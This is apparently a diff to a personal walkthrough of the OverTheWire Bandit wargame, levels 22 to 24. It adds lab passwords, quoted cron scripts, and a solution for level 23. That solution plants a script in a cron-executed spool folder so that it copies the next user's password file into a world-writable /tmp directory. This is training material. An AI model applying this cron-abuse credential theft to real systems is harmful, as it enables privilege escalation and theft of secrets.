@@ -444,6 +444,8 @@ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
 
 22 -
 
+Learn how to read a bash script
+
 ```ssh
 ssh bandit22@bandit.labs.overthewire.org -p 2220
 ```
@@ -452,6 +454,90 @@ ssh bandit22@bandit.labs.overthewire.org -p 2220
 WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff
 ```
 
-23 -
+```sh
+cat /usr/bin/cronjob_bandit23.sh
+```
+
+```bash
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+```
+
+23 - Create a script
+
+A program is running automatically at regular intervals from cron, the time-based
+job scheduler. Look in /etc/cron.d/ for the configuration and see what command is
+being executed.
+
+NOTE: This level requires you to create your own first shell-script. This is a
+very big step and you should be proud of yourself when you beat this level!
+
+NOTE 2: Keep in mind that your shell script is removed once executed, so you may
+want to keep a copy around…
+
+```ssh
+ssh bandit23@bandit.labs.overthewire.org -p 2220
+```
+
+```sh
+QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
+```
+
+```sh
+cat /usr/bin/cronjob_bandit24.sh
+```
+
+```sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname/foo
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+```
+
+```sh
+mkdir /tmp/rand
+cd /tmp/rand
+touch script.sh
+```
+
+```sh
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/rand/password
+```
+
+```sh
+cp script.sh /var/spool/bandit24/foo
+chmod 777 /tmp/rand
+```
+
 24 -
+
+```ssh
+ssh bandit24@bandit.labs.overthewire.org -p 2220
+```
+
+```sh
+VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
+```
+
 25 -
